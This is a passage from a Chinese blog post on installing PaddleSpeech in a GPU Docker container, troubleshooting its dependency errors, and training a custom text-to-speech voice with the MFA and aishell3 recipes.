/h/MyPrograms/Python/PaddleSpeech:/home/PaddleSpeech <span class="token parameter variable">-v</span> /g/Docker/volumes/paddlespeech_gpu/mnt:/mnt <span class="token parameter variable">-v</span> /g/Docker/volumes/paddlespeech_gpu/root:/root <span class="token parameter variable">-v</span> /d/TensorFlowNotebook:/notebook <span class="token parameter variable">-v</span> /g/Docker/volumes/paddlespeech_gpu/.jupyter:/root/.jupyter paddlecloud/paddlespeech:develop-gpu-cuda11.2-cudnn8-478fd2 /bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>Windows 安装 Docker 后弹出的防火墙提示，一定要选中公共，否则只有本机能访问!!</p></blockquote><h3 id="其他安装项"><a href="#其他安装项" class="headerlink" title="其他安装项"></a>其他安装项</h3><p>根据<a href="#%E9%97%AE%E9%A2%98">我遇到的问题</a>进行的教程以外的安装项</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt</span> <span class="token function">install</span> libsndfile1 sox libopenblas-dev <span class="token parameter variable">-y</span><span class="token comment"># pip install paddlepaddle==2.4.1 -i https://mirror.baidu.com/pypi/simple</span><span class="token comment"># https://www.paddlepaddle.org.cn/install/quick?docurl=/documentation/docs/zh/install/pip/linux-pip.html</span>pip <span class="token function">install</span> paddlepaddle-gpu<span class="token operator">==</span><span class="token number">2.4</span>.1.post112 <span class="token parameter variable">-f</span> https://www.paddlepaddle.org.cn/whl/linux/mkl/avx/stable.htmlpip <span class="token function">install</span> pytest-runner <span class="token parameter variable">-i</span> https://pypi.tuna.tsinghua.edu.cn/simple<span class="token builtin class-name">cd</span> <span class="token variable">${<span class="token environment constant">HOME</span>}</span><span class="token function">wget</span> https://paddlespeech.bj.bcebos.com/Parakeet/tools/nltk_data.tar.gz<span class="token function">tar</span> <span class="token parameter variable">-zxvf</span> nltk_data.tar.gz<span class="token builtin class-name">cd</span> /home/PaddleSpeech<span class="token comment"># 更新 PaddleSpeech</span><span class="token function">git</span> fetch <span class="token operator">&amp;&amp;</span> <span class="token function">git</span> pull <span class="token operator">&amp;&amp;</span> pip <span class="token function">install</span> <span class="token builtin class-name">.</span><span class="token comment"># 安装 Kaldi(http://kaldi-asr.org/),可选</span><span class="token function">pushd</span> tools<span class="token comment"># 我这里安装报错，在 make 命令添加 TARGET 参数后安装成功 </span><span class="token comment"># make PREFIX=$(pwd)/OpenBLAS/install USE_LOCKING=1 USE_THREAD=0 TARGET=HASWELL -C OpenBLAS all install</span><span class="token function">bash</span> extras/install_openblas.sh<span class="token comment"># 安装过程很长，另外可能需要先执行这个 apt-get install sox -y</span><span class="token function">bash</span> extras/install_kaldi.sh<span class="token function">popd</span><span class="token comment"># 手动安装 MFA，需要 python 3.8，而且时间也很长...这里直接用自带的了</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="启动-JupyterLab"><a href="#启动-JupyterLab" class="headerlink" title="启动 JupyterLab"></a>启动 JupyterLab</h3><p>镜像中内置 Jupyter Lab, 顺便启动了</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 内置 JupyterLab</span><span class="token comment"># 安装中文包</span>pip <span class="token function">install</span> jupyterlab-language-pack-zh-CN<span class="token comment"># 设置密码</span>jupyter server password<span class="token comment"># 启动 JupyterLab</span>jupyter-lab <span class="token parameter variable">--ip</span><span class="token operator">=</span><span class="token number">0.0</span>.0.0 <span class="token parameter variable">--port</span><span class="token operator">=</span><span class="token number">8888</span> --allow-root --notebook-dir<span class="token operator">=</span>/notebook<span class="token comment"># 后台 </span><span class="token function">nohup</span> jupyter-lab <span class="token parameter variable">--ip</span><span class="token operator">=</span><span class="token number">0.0</span>.0.0 <span class="token parameter variable">--port</span><span class="token operator">=</span><span class="token number">8888</span> --allow-root --notebook-dir<span class="token operator">=</span>/notebook <span class="token operator">&gt;</span> /mnt/jupyterlab.log <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">&amp;</span><span class="token comment"># 关闭后台</span><span class="token function">ps</span> <span class="token parameter variable">-aux</span> <span class="token operator">|</span> <span class="token function">grep</span> jupyter<span class="token function">kill</span> <span class="token parameter variable">-9</span> <span class="token number">9608</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="注意！"><a href="#注意！" class="headerlink" title="注意！"></a>注意！</h5><blockquote><p>容器启动后执行一下 <code>nvidia-smi</code> 命令测试能否调用 GPU</p><p>磁盘挂载一定要在 Windows 命令行中执行，否则回挂载到 WSL 虚拟机中的路径，Windows 看不到！</p></blockquote><h3 id="后端服务"><a href="#后端服务" class="headerlink" title="后端服务"></a><a href="https://github.com/PaddlePaddle/PaddleSpeech/blob/develop/demos/speech_server/README_cn.md">后端服务</a></h3><p>安装完成后，开发者可以通过命令行一键启动语音识别，语音合成，音频分类等多种服务</p><p>它是一个离线语音服务和访问服务的实现。可以通过使用 <code>paddlespeech_server</code> 和 <code>paddlespeech_client</code> 的单个命令或 python 的几行代码来实现</p><p>服务接口定义请参考:</p><ul><li><a href="https://github.com/PaddlePaddle/PaddleSpeech/wiki/PaddleSpeech-Server-RESTful-API">PaddleSpeech Server RESTful API</a></li></ul><p>你可以在 AI Studio 中快速体验：<a href="https://aistudio.baidu.com/aistudio/projectdetail/4354592?sUid=2470186&amp;shared=1&amp;ts=1660878208266">SpeechServer 一键部署</a></p><h4 id="启动服务"><a href="#启动服务" class="headerlink" title="启动服务"></a>启动服务</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># paddlespeech_server start --config_file ./conf/application.yaml</span>paddlespeech_server start <span class="token parameter variable">--config_file</span> /root/speech_server/application.yaml<span class="token comment"># 后台启动</span><span class="token function">nohup</span> paddlespeech_server start <span class="token parameter variable">--config_file</span> /root/speech_server/application.yaml <span class="token operator">&gt;</span> /mnt/paddlespeech_server.log <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="访问语音识别服务"><a href="#访问语音识别服务" class="headerlink" title="访问语音识别服务"></a>访问语音识别服务</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">paddlespeech_client asr <span class="token parameter variable">--server_ip</span> <span class="token number">127.0</span>.0.1 <span class="token parameter variable">--port</span> <span class="token number">8090</span> <span class="token parameter variable">--input</span> input_16k.wav<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><h4 id="OSError-sndfile-library-not-found"><a href="#OSError-sndfile-library-not-found" class="headerlink" title="OSError: sndfile library not found"></a>OSError: sndfile library not found</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt</span> <span class="token function">install</span> libsndfile1 <span class="token parameter variable">-y</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="grep-warning-GREP-OPTIONS-is-deprecated-please-use-an-alias-or-script"><a href="#grep-warning-GREP-OPTIONS-is-deprecated-please-use-an-alias-or-script" class="headerlink" title="grep: warning: GREP_OPTIONS is deprecated; please use an alias or script"></a>grep: warning: GREP_OPTIONS is deprecated; please use an alias or script</h4><p>这一行的打印提示是为了说明grep命令输出高亮字，并不影响程序的运行</p><p>可参考<a href="https://stackoverflow.com/questions/31156517/how-to-get-rid-of-grep-warning-grep-options-is-deprecated-please-use-an-alia">这里</a>关闭高亮</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">unset</span> GREP_OPTIONS<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>可以添加到 <code>.bashrc</code> 中一劳永逸</p></blockquote><h4 id="declarative-got-an-unexpected-keyword-argument-‘property’"><a href="#declarative-got-an-unexpected-keyword-argument-‘property’" class="headerlink" title="declarative() got an unexpected keyword argument ‘property’"></a>declarative() got an unexpected keyword argument ‘property’</h4><p>参考<a href="https://github.com/PaddlePaddle/PaddleSpeech/issues/2512">https://github.com/PaddlePaddle/PaddleSpeech/issues/2512</a></p><p>property 是 paddle 2.4rc 中新增的功能，如果用到 paddlespeech develop 的代码的话，需要使用 paddle 的 dev 版本或 &gt;=2.4rc</p><blockquote><p>写此文时，官网要求相关依赖<br></p><ul><li>gcc &gt;= 4.8.5<br></li><li><strong>paddlepaddle &gt;= 2.4.1</strong><br></li><li>python &gt;= 3.7<br></li><li>linux(推荐), mac, windows<br></li></ul></blockquote><p><a href="https://www.paddlepaddle.org.cn/install/quick?docurl=/documentation/docs/zh/install/pip/linux-pip.html">Paddle 详细安装说明</a></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 原先为 2.3.0.post112</span>pip <span class="token function">install</span> paddlepaddle-gpu<span class="token operator">==</span><span class="token number">2.4</span>.1.post112 <span class="token parameter variable">-f</span> https://www.paddlepaddle.org.cn/whl/linux/mkl/avx/stable.html<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="nltk-data-Error-loading-averaged-perceptron-tagger-lt-urlopen-error"><a href="#nltk-data-Error-loading-averaged-perceptron-tagger-lt-urlopen-error" class="headerlink" title="[nltk_data] Error loading averaged_perceptron_tagger: <urlopen error"></a>[nltk_data] Error loading averaged_perceptron_tagger: &lt;urlopen error</h3><p>下载 <strong>nltk_data</strong> 时网络不佳，可以提前下载 <a href="https://paddlespeech.bj.bcebos.com/Parakeet/tools/nltk_data.tar.gz">nltk_data</a> 并解压缩到 <code>${HOME}</code> 目录下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> <span class="token variable">${<span class="token environment constant">HOME</span>}</span><span class="token function">wget</span> https://paddlespeech.bj.bcebos.com/Parakeet/tools/nltk_data.tar.gz<span class="token function">tar</span> <span class="token parameter variable">-zxvf</span> nltk_data.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="cudaErrorNoKernelImageForDevice"><a href="#cudaErrorNoKernelImageForDevice" class="headerlink" title="cudaErrorNoKernelImageForDevice"></a>cudaErrorNoKernelImageForDevice</h4><pre class="line-numbers language-log" data-language="log"><code class="language-log">terminate called after throwing an instance of <span class="token string">'thrust::system::system_error'</span>  what<span class="token operator">(</span><span class="token operator">)</span><span class="token operator">:</span>  parallel_for failed<span class="token operator">:</span> cudaErrorNoKernelImageForDevice<span class="token operator">:</span> no kernel image is available for execution on the deviceAborted<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>cudaErrorNoKernelImageForDevice</code> 应该是 paddle 的 cuda 版本和你机器的 cuda 版本不一致导致的（你自己机器的 cuda 有达到 11.6 么），在 paddle 的 issue 区可以搜到</p><p>参考:</p><ul><li><a href="https://github.com/PaddlePaddle/PaddleSpeech/issues/991">https://github.com/PaddlePaddle/PaddleSpeech/issues/991</a></li><li><a href="https://github.com/PaddlePaddle/PaddleSpeech/issues/2506">https://github.com/PaddlePaddle/PaddleSpeech/issues/2506</a></li></ul><h4 id="DeprecationWarning"><a href="#DeprecationWarning" class="headerlink" title="DeprecationWarning"></a>DeprecationWarning</h4><h4 id="The-installed-Paddle-is-compiled-with-CUDNN-8-2-but-CUDNN-version-in-your-machine-is-8-1"><a href="#The-installed-Paddle-is-compiled-with-CUDNN-8-2-but-CUDNN-version-in-your-machine-is-8-1" class="headerlink" title="The installed Paddle is compiled with CUDNN 8.2, but CUDNN version in your machine is 8.1"></a>The installed Paddle is compiled with CUDNN 8.2, but CUDNN version in your machine is 8.1</h4><p>安装 CUDNN 8.2 并替换</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/usr/local/cuda-11.2 <span class="token function">ls</span> <span class="token parameter variable">-l</span>total 40Klrwxrwxrwx <span class="token number">1</span> root root   <span class="token number">28</span> Dec  <span class="token number">1</span>  <span class="token number">2020</span> include -<span class="token operator">&gt;</span> targets/x86_64-linux/includelrwxrwxrwx <span class="token number">1</span> root root   <span class="token number">24</span> Feb  <span class="token number">5</span>  <span class="token number">2021</span> lib64 -<span class="token operator">&gt;</span> targets/x86_64-linux/libdrwxr-xr-x <span class="token number">1</span> root root <span class="token number">4</span>.0K Mar  <span class="token number">8</span>  <span class="token number">2021</span> targets/<span class="token builtin class-name">cd</span> /usr/local/cuda-11.2<span class="token builtin class-name">cd</span> /usr/local/cuda-11.2/targets/x86_64-linux<span class="token function">cp</span> /mnt/cuDNN/cuDNN_v8.2.1_for_cuda_11.x/cuda/include/cudnn.h ./include/<span class="token function">cp</span> /mnt/cuDNN/cuDNN_v8.2.1_for_cuda_11.x/cuda/lib64/libcudnn* ./lib/<span class="token function">chmod</span> a+r /usr/local/cuda*/include/cudnn.h /usr/local/cuda*/lib64/libcudnn*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="No-such-file-or-directory-‘exp-x2F-mfa-train-and-align-x2F-baker-corpus-x2F-train-x2F-mfcc-x2F-raw-mfcc-0-scp’"><a href="#No-such-file-or-directory-‘exp-x2F-mfa-train-and-align-x2F-baker-corpus-x2F-train-x2F-mfcc-x2F-raw-mfcc-0-scp’" class="headerlink" title="No such file or directory: ‘exp/.mfa_train_and_align/baker_corpus/train/mfcc/raw_mfcc.0.scp’"></a>No such file or directory: ‘exp/.mfa_train_and_align/baker_corpus/train/mfcc/raw_mfcc.0.scp’</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt</span> <span class="token function">install</span> libopenblas-dev<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在安装 libopenblas-dev 后<br>删除 MFA 附带的库将强制 MFA 使用您安装的库, MFA 就应该可以正常工作了</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">rm</span> <span class="token punctuation">{</span>mfa_dir<span class="token punctuation">}</span>/lib/thirdparty/bin/libopenblas.so.0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="AssertionError-This-dataset-has-no-examples"><a href="#AssertionError-This-dataset-has-no-examples" class="headerlink" title="AssertionError: This dataset has no examples"></a>AssertionError: This dataset has no examples</h4><p>问题同上, 安装完成后删除 PaddleSpeech 目录下所有的 <code>libopenblas.so.0</code> 即可</p><h4 id="SystemError-Fatal-DataLoader-process"><a href="#SystemError-Fatal-DataLoader-process" class="headerlink" title="SystemError: (Fatal) DataLoader process"></a>SystemError: (Fatal) DataLoader process</h4><pre class="line-numbers language-none"><code class="language-none">SystemError: (Fatal) DataLoader process (pid  1. If run DataLoader by DataLoader.from_generator(...), queue capacity is set by from_generator(..., capacity=xx, ...).  2. If run DataLoader by DataLoader(dataset, ...), queue capacity is set as 2 times of the max value of num_workers and len(places).  3. If run by DataLoader(dataset, ..., use_shared_memory=True), set use_shared_memory=False for not using shared memory.) exited is killed by signal: 21707.  It may be caused by insufficient shared storage space. This problem usually occurs when using docker as a development environment.  Please use command `df -h` to check the storage space of `/dev/shm`. Shared storage space needs to be greater than (DataLoader Num * DataLoader queue capacity * 1 batch data size).  You can solve this problem by increasing the shared storage space or reducing the queue capacity appropriately.Bus error (at /paddle/paddle/fluid/imperative/data_loader.cc:183)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这可能是由于共享存储空间不足引起的。使用 docker 作为开发环境时，通常会发生此问题。<br>请使用命令 ‘df -h’ 检查 ‘devshm’ 的存储空间. Shared storage space needs to be greater than (DataLoader Num * DataLoader queue capacity * 1 batch data size</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">λ 60cc7c67bf7f /home/PaddleSpeech/examples/aishell3/tts3 <span class="token function">df</span> <span class="token parameter variable">-h</span>Filesystem      Size  Used Avail Use% Mounted onoverlay         251G   32G  207G  <span class="token number">14</span>% /tmpfs            64M     <span class="token number">0</span>   64M   <span class="token number">0</span>% /devtmpfs            16G     <span class="token number">0</span>   16G   <span class="token number">0</span>% /sys/fs/cgroupshm              64M   64K   64M   <span class="token number">1</span>% /dev/shmdrvfs           <span class="token number">4</span>.6T  227G  <span class="token number">4</span>.4T   <span class="token number">5</span>% /mntdrvfs           700G  394G  307G  <span class="token number">57</span>% /notebookdrvfs           <span class="token number">3</span>.7T  <span class="token number">3</span>.6T  116G  <span class="token number">97</span>% /home/PaddleSpeech/dev/sdb        251G   32G  207G  <span class="token number">14</span>% /etc/hostsdrivers         231G  187G   45G  <span class="token number">81</span>% /usr/bin/nvidia-smilib             231G  187G   45G  <span class="token number">81</span>% /usr/lib/x86_64-linux-gnu/libcuda.so.1none             16G     <span class="token number">0</span>   16G   <span class="token number">0</span>% /dev/dxgtmpfs            16G     <span class="token number">0</span>   16G   <span class="token number">0</span>% /proc/acpitmpfs            16G     <span class="token number">0</span>   16G   <span class="token number">0</span>% /sys/firmware<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>docker run</code> 命令加上 <a href="https://github.com/PaddlePaddle/PaddleSpeech/issues/790#issuecomment-906128565"><code>--ipc=host</code></a> 后就可以共享宿主机内存了</p><h5 id="关于-Docker-容器间的-IPC-通信"><a href="#关于-Docker-容器间的-IPC-通信" class="headerlink" title="关于 Docker 容器间的 IPC 通信"></a>关于 Docker 容器间的 IPC 通信</h5><p><code>docker run --ipc=""</code> 可以设置共享内存，ipc 参数有两种使用方式</p><ol><li><p>容器间都共享宿主机的内存</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 所有容器启动时加入该参数</span><span class="token function">docker</span> run <span class="token parameter variable">--ipc</span><span class="token operator">=</span>host<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>共享其中某个容器的内存, 例如使用容器1的内存</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 启动容器1，将其设置为共享模式. 2fdf93c10b4e 替换为自己的镜像 id</span><span class="token function">docker</span> run <span class="token parameter variable">-it</span> <span class="token parameter variable">--ipc</span><span class="token operator">=</span>shareable <span class="token parameter variable">--name</span> ipc_container1 2fdf93c10b4e /bin/bash<span class="token comment"># 启动容器2，连接到容器1的内存</span><span class="token function">docker</span> run <span class="token parameter variable">-it</span> <span class="token parameter variable">--ipc</span><span class="token operator">=</span>container:ipc_container1 <span class="token parameter variable">--name</span> ipc_container2 2fdf93c10b4e /bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h4 id="ImportError-libcudart-so-10-2-cannot-open-shared-object-file-No-such-file-or-directory"><a href="#ImportError-libcudart-so-10-2-cannot-open-shared-object-file-No-such-file-or-directory" class="headerlink" title="ImportError: libcudart.so.10.2: cannot open shared object file: No such file or directory"></a>ImportError: libcudart.so.10.2: cannot open shared object file: No such file or directory</h4><p>参考 <a href="https://github.com/PaddlePaddle/Paddle/issues/49581">https://github.com/PaddlePaddle/Paddle/issues/49581</a></p><p><a href="https://pypi.org/project/paddlepaddle-gpu/">paddlepaddle-gpu 依赖库官方说明</a>中先决条件:</p><blockquote><p>得！GPU 版本最高支持 CUDA 10，白搞，再来一遍吧…</p></blockquote><h4 id="OpenBLAS-Detecting-CPU-failed-Please-set-TARGET-explicitly-e-g-make-TARGET-x3D-your-cpu-target"><a href="#OpenBLAS-Detecting-CPU-failed-Please-set-TARGET-explicitly-e-g-make-TARGET-x3D-your-cpu-target" class="headerlink" title="OpenBLAS: Detecting CPU failed. Please set TARGET explicitly, e.g. make TARGET=your_cpu_target"></a>OpenBLAS: Detecting CPU failed. Please set TARGET explicitly, e.g. make TARGET=your_cpu_target</h4><p>安装 Kaldi 时报错</p><p>在自动安装脚本中的 <code>make</code> 命令添加 <code> TARGET=your_cpu_target</code> 参数</p><p>我在这里将</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">make</span> <span class="token assign-left variable">PREFIX</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">pwd</span><span class="token variable">)</span></span>/OpenBLAS/install <span class="token assign-left variable">USE_LOCKING</span><span class="token operator">=</span><span class="token number">1</span> <span class="token assign-left variable">USE_THREAD</span><span class="token operator">=</span><span class="token number">0</span> <span class="token parameter variable">-C</span> OpenBLAS all <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>改为</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">make</span> <span class="token assign-left variable">PREFIX</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">pwd</span><span class="token variable">)</span></span>/OpenBLAS/install <span class="token assign-left variable">USE_LOCKING</span><span class="token operator">=</span><span class="token number">1</span> <span class="token assign-left variable">USE_THREAD</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">TARGET</span><span class="token operator">=</span>HASWELL <span class="token parameter variable">-C</span> OpenBLAS all <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><a href="https://github.com/xianyi/OpenBLAS/issues/2227">参考1</a><br><a href="https://github.com/xianyi/OpenBLAS/issues/1204#issuecomment-308457857">参考2</a></p><h5 id="ON-WINDOWS"><a href="#ON-WINDOWS" class="headerlink" title="ON WINDOWS:"></a>ON WINDOWS:</h5><ul><li>Windows 7/8/10 Pro/Enterprise (64bit)<ul><li>GPU version support CUDA 9.0/9.1/9.2/10.0/10.1，only supports single card</li></ul></li><li>Python version 2.7.15+/3.5.1+/3.6/3.7/3.8 (64 bit)</li><li>pip version 9.0.1+ (64 bit)</li></ul><h5 id="ON-LINUX"><a href="#ON-LINUX" class="headerlink" title="ON LINUX:"></a>ON LINUX:</h5><ul><li>Linux Version (64 bit)<ul><li>CentOS 6 (GPU Version Supports CUDA 9.0/9.1/9.2/10.0/10.1, only supports single card)**</li><li>CentOS 7 (GPUVersion Supports CUDA 9.0/9.1/9.2/10.0/10.1, CUDA 9.1 only supports single card)**</li><li>Ubuntu 14.04 (GPUVersion Supports CUDA 10.0/10.1)</li><li>Ubuntu 16.04 (GPUVersion Supports CUDA 9.0/9.1/9.2/10.0/10.1)</li><li>Ubuntu 18.04 (GPUVersion Supports CUDA 10.0/10.1)</li></ul></li><li>Python Version: 2.7.15+/3.5.1+/3.6/3.7/3.8 (64 bit)</li><li>pip or pip3 Version 20.2.2+ (64 bit)</li></ul><h5 id="ON-MACOS"><a href="#ON-MACOS" class="headerlink" title="ON MACOS:"></a>ON MACOS:</h5><ul><li>MacOS version 10.11/10.12/10.13/10.14 (64 bit) (not support GPU version yet)</li><li>Python version 2.7.15+/3.5.1+/3.6/3.7/3.8 (64 bit)</li><li>pip or pip3 version 9.0.1+ (64 bit)</li></ul><h2 id="训练一个自己的-TTS-模型"><a href="#训练一个自己的-TTS-模型" class="headerlink" title="训练一个自己的 TTS 模型"></a><a href="https://github.com/PaddlePaddle/PaddleSpeech/discussions/1842">训练一个自己的 TTS 模型</a></h2><p>首先看一下效果 <a href="https://www.bilibili.com/video/BV1Vr4y18738">对 paddlespeech 的拙劣尝试</a> 和 <a href="https://www.bilibili.com/video/BV1kU4y1m7aH">对 paddlespeech 的拙劣尝试 2</a></p><p>我们需要走通 <code>other/mfa</code> 和 <code>aishell3/tts3</code> 两个流程</p><blockquote><p>另外 windows 电脑也能搞这个 用 Git Bash 就好了 有的地方要小改一下<br><br>反正我是没搞出来…</p></blockquote><blockquote><p><a href="https://github.com/kslz">大佬</a>说:<br><br>已经挺细了 可以直接去读一下 shell 代码 基本就知道流程了，因为我不懂 shell 也不怎么懂 python 都能把流程走下来，所以我估计换一个人来走一遍流程也是轻而易举的<br><br>我估计我再写的细点，就要去牢里蹬缝纫机了</p></blockquote><h4 id="收集数据"><a href="#收集数据" class="headerlink" title="收集数据"></a>收集数据</h4><p>数据收集自网上，一种 speaker 大概需要 600 句话。获取到数据后用 <a href="https://github.com/boy1dr/SpleeterGui">SpleeterGui</a> 进行背景音乐的分离，只取人声。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 视频提取 wav</span>ffmpeg <span class="token parameter variable">-i</span> .<span class="token punctuation">\</span><span class="token number">12</span>.mp4 <span class="token parameter variable">-ac</span> <span class="token number">1</span> <span class="token parameter variable">-ar</span> <span class="token number">16000</span> <span class="token parameter variable">-y</span> <span class="token number">12</span>.wav<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="数据标注"><a href="#数据标注" class="headerlink" title="数据标注"></a>数据标注</h4><p><a href="https://github.com/kslz">大佬</a>写了个小软件, 啪的一下, 很快啊, 就标注完了，然后模仿 <code>aishell3</code> 的格式制作数据集，<strong>记得要排除所有非中文字符</strong></p><p>经过<a href="https://github.com/kslz">大佬</a>的尝试和读代码, <a href="https://github.com/kslz">大佬</a>觉得照搬 <code>aishell3</code> 的 <code>speaker</code> 名的方式是最好的，改动少。</p><p>用 <code>pypinyin</code> 制作标注文本，效果不怎么喜人，但是大概够用。记得抽出几句来填进 test 文件夹里。</p><h4 id="获取-mfa-结果"><a href="#获取-mfa-结果" class="headerlink" title="获取 mfa 结果"></a>获取 mfa 结果</h4><p><code>other/mfa</code> 强制对齐(Montreal-Forced-Aligner) 流程走一下</p><blockquote><p>可能需要<a href="https://github.com/MontrealCorpusTools/Montreal-Forced-Aligner">安装 MFA 命令</a><br><br>需要从其<a href="https://test.data-baker.com/data/index/source">官方网站</a>下载 BZNSYP 并解压缩。并设置数据集的路径为 <code>~/datasets/BZNSYP</code></p></blockquote><p>流程里下载的是 linux 版本的二进制文件</p><p>如果你是 windows 的电脑记得改成下载 windows 版本的文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># corpus_directory:包含我们的语音文件和文本的文件夹</span><span class="token comment"># dictionary：我们刚刚下载的字典</span><span class="token comment"># acoustic_model：声学模型，pretrained中的english.zip(注意这个文件不能解压）</span><span class="token comment"># output_directory：输出目录文件夹</span>mfa_align corpus_directory dictionary acoustic_model output_directory<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="数据预处理"><a href="#数据预处理" class="headerlink" title="数据预处理"></a>数据预处理</h4><p><code>mfa</code> 结果有了之后去走 <code>aishell3/tts3</code> 的流程</p><p>先<a href="http://www.aishelltech.com/aishell_3">下载预训练好的那个 <code>aishell3_fastspeech2</code> 模型</a>, 挺大的…</p><p>然后 <strong>??把脚本里的音素对照表指向这里的音素对照表，不要用你自己生成的那个</strong></p><p>运行 <code>run.sh</code> 的时候报错，脚本中用了两块 GPU</p><p>将 <code>gpus</code> <code>0</code>, 将 <code>local/train.sh</code> 中的 <code>ngpu</code> 改成 <code>1</code></p><pre class="line-numbers language-none"><code class="language-none">Invalid CUDAPlace(1), must inside [0, 1), because GPU number on your machine is 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>or</p><pre class="line-numbers language-none"><code class="language-none">Traceback (most recent call last):  File "/home/PaddleSpeech/paddlespeech/t2s/exps/fastspeech2/train.py", line 222, in &lt;module&gt;    main()  File "/home/PaddleSpeech/paddlespeech/t2s/exps/fastspeech2/train.py", line 216, in main    dist.spawn(train_sp, (args, config), nprocs=args.ngpu)  File "/usr/local/lib/python3.7/dist-packages/paddle/distributed/spawn.py", line 574, in spawn    procs_env_list = _get_subprocess_env_list(nprocs, options)  File "/usr/local/lib/python3.7/dist-packages/paddle/distributed/spawn.py", line 187, in _get_subprocess_env_list    (len(env_devices_list), nprocs))RuntimeError: the number of visible devices(1) is less than the number of spawn processes(2), please ensure that the correct `nprocs` argument is passed or the environment variable `CUDA_VISIBLE_DEVICES` is correctly configured.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="训练"><a href="#训练" class="headerlink" title="训练"></a>训练</h4><p>走流程 练一会 然后停下 进 <code>checkpoints</code> 文件夹，**??把预训练模型复制进来然后编辑那个 jsonl 文件。删的只剩一行然后把那一行里的 <code>pdz</code> 文件指向你刚复制进来的那个模型就可以接着训练了。**</p><h4 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h4><p>你可以走 <code>e2e</code> 那个 <code>step</code> 然后指定好 <code>speaker</code> 如果不出意外的话，你就能听到你的训练结果了。</p><blockquote><p><a href="https://github.com/kslz">大佬</a>的嘱托<br><br>如果你的训练效果特别好 那我只希望<br><br><img src="https://user-images.githubusercontent.com/54951765/166875062-3ec8e008-483b-4ff3-9f01-ae781613dbc6.jpeg" alt="日后你惹出祸来，不把师傅说出来就行了"></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> AI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 语音合成 </tag>
            
            <tag> 语音识别 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker 中使用 Nvidia 显卡</title>
      <link href="/2022/10/22/usenvidiaindocker/"/>
      <url>/2022/10/22/usenvidiaindocker/</url>
      
